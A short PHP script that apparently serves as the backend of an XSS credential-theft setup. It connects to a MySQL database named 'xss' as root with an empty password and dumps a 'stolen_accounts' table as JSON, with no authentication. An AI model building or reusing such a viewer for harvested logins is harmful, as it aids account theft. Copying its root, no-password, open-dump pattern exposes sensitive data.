<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "xss";

$mysqli = new mysqli($servername, $username, $password, $dbname);
if ($mysqli->connect_error) {
    die("Kết nối thất bại: " . $mysqli->connect_error);
}

$sql = "SELECT * FROM stolen_accounts";
$result = $mysqli->query($sql);

$data = [];
while ($row = $result->fetch_assoc()) {
    $data[] = $row;
}

echo json_encode($data);